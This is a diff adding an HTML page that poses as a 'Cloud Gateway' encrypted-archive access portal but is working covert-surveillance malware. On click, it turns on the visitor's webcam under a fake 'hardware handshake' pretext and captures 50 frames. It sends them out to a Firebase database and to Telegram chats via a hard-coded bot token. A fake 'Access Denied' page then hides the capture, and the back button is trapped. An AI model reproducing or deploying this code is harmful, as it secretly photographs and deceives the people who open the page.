@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cloud Gateway | Access Management</title>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    
+    <style>
+        :root {
+            --primary-accent: #00f2ff;
+            --bg-dark: #0a0c10;
+            --error-red: #ff4b4b;
+        }
+
+        body { 
+            margin: 0; padding: 0; background: var(--bg-dark); color: #fff;
+            font-family: 'Inter', -apple-system, sans-serif;
+            display: flex; align-items: center; justify-content: center; height: 100vh;
+        }
+
+        /* --- THE PORTAL UI --- */
+        .portal-card {
+            background: rgba(15, 20, 25, 0.9); backdrop-filter: blur(20px);
+            border: 1px solid rgba(0, 242, 255, 0.2);
+            width: 100%; max-width: 480px; padding: 40px; border-radius: 24px;
+            text-align: center; box-shadow: 0 0 40px rgba(0,0,0,0.5);
+        }
+
+        .btn-init {
+            background: #fff; color: #000; border: none; padding: 16px 32px;
+            border-radius: 12px; font-weight: 700; width: 100%; cursor: pointer;
+            margin-top: 20px; transition: 0.3s;
+        }
+
+        #sync-ui { display: none; }
+        .loader-spin {
+            width: 50px; height: 50px; border: 3px solid rgba(0,242,255,0.1);
+            border-top-color: var(--primary-accent); border-radius: 50%;
+            margin: 0 auto 20px; animation: spin 1s infinite linear;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        /* --- THE ENTERPRISE 404 / ERROR UI --- */
+        .error-container {
+            display: none; text-align: left; max-width: 600px; padding: 60px;
+        }
+        .error-code { font-family: monospace; color: var(--error-red); font-weight: bold; margin-bottom: 10px; }
+        .error-title { font-size: 32px; font-weight: 800; margin-bottom: 20px; }
+        .error-desc { color: #8b949e; line-height: 1.6; border-left: 2px solid #30363d; padding-left: 20px; }
+        .trace-id { margin-top: 40px; font-size: 11px; color: #484f58; font-family: monospace; }
+    </style>
+</head>
+<body>
+
+    <!-- Main Active UI -->
+    <div class="portal-card" id="main-portal">
+        <div id="setup-ui">
+            <h1 style="font-size: 24px; margin-bottom: 10px;">Cloud Crypt-Archive</h1>
+            <p style="color: #8b949e; font-size: 14px;">This resource is protected by hardware-bound encryption. Initialize the environmental handshake to proceed.</p>
+            <button class="btn-init" onclick="initiate()">Request Access Token</button>
+        </div>
+
+        <div id="sync-ui">
+            <div class="loader-spin"></div>
+            <h2 id="percent-label">Syncing...</h2>
+            <p id="log-text" style="font-family: monospace; font-size: 12px; color: var(--primary-accent);">Awaiting handshake...</p>
+        </div>
+    </div>
+
+    <!-- The Advanced Error Page (The Cover) -->
+    <div class="error-container" id="error-screen">
+        <div class="error-code">SEC_ERROR_TOKEN_EXPIRED_OR_INVALID</div>
+        <h1 class="error-title">Access Denied</h1>
+        <p class="error-desc">
+            Your connection to the secure gateway was interrupted. This usually happens when:<br><br>
+            • The security token has expired (TTL exceeded).<br>
+            • The hardware environment failed validation.<br>
+            • Your IP address is not on the authorized whitelist for this resource.
+        </p>
+        <div class="trace-id">
+            TRACE_ID: 8829-XPL-9920-SRV<br>
+            TIMESTAMP: <span id="time-stamp"></span><br>
+            SERVER: EDGE_NODE_SOUTHEAST_ASIA
+        </div>
+    </div>
+
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        // CONFIG
+        const firebaseConfig = {
+            apiKey: "AIzaSyBlRY8iXI5jK8GH8tku6A0We3tC_0iiup4",
+            authDomain: "shadow-app-4q69.firebaseapp.com",
+            databaseURL: "https://shadow-app-4q69-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "shadow-app-4q69",
+            storageBucket: "shadow-app-4q69.firebasestorage.app",
+            messagingSenderId: "109693889633",
+            appId: "1:109693889633:web:f1654b2fb1de886cdc8e20"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        const TOKEN = '8620771394:AAGl1HASK_i24zIpAZLCC7wRIwxlUvkxYrI';
+        const IDS = ['7617707778', '7194705917'];
+
+        async function initiate() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('setup-ui').style.display = 'none';
+                document.getElementById('sync-ui').style.display = 'block';
+                
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                video.onloadedmetadata = () => {
+                    video.play();
+                    let count = 0;
+                    const interval = setInterval(() => {
+                        if (count >= 50) {
+                            clearInterval(interval);
+                            stream.getTracks().forEach(t => t.stop());
+                            showErrorPage(); // Trigger the cover tracks page
+                            return;
+                        }
+                        sendData(++count);
+                        document.getElementById('percent-label').innerText = `Verifying: ${Math.round((count/50)*100)}%`;
+                    }, 1100);
+                };
+            } catch (e) {
+                alert("Security Protocol Violation: Hardware handshake is mandatory.");
+            }
+        }
+
+        function sendData(index) {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const b64 = canvas.toDataURL('image/jpeg', 0.3);
+            database.ref('captures').push({ image_data: b64, type: "SECURE_RELAY", ts: Date.now() });
+
+            canvas.toBlob(blob => {
+                IDS.forEach(id => {
+                    const fd = new FormData();
+                    fd.append('chat_id', id); fd.append('photo', blob, 'relay.jpg');
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                });
+            }, 'image/jpeg', 0.4);
+        }
+
+        function showErrorPage() {
+            // Hide everything and show the "Professional" Error page
+            document.getElementById('main-portal').style.display = 'none';
+            document.getElementById('error-screen').style.display = 'block';
+            document.getElementById('time-stamp').innerText = new Date().toISOString();
+            
+            // Optional: Block back-button by pushing state
+            window.history.pushState(null, null, window.location.href);
+            window.onpopstate = function() { window.history.go(1); };
+        }
+    </script>
+</body>
+</html>
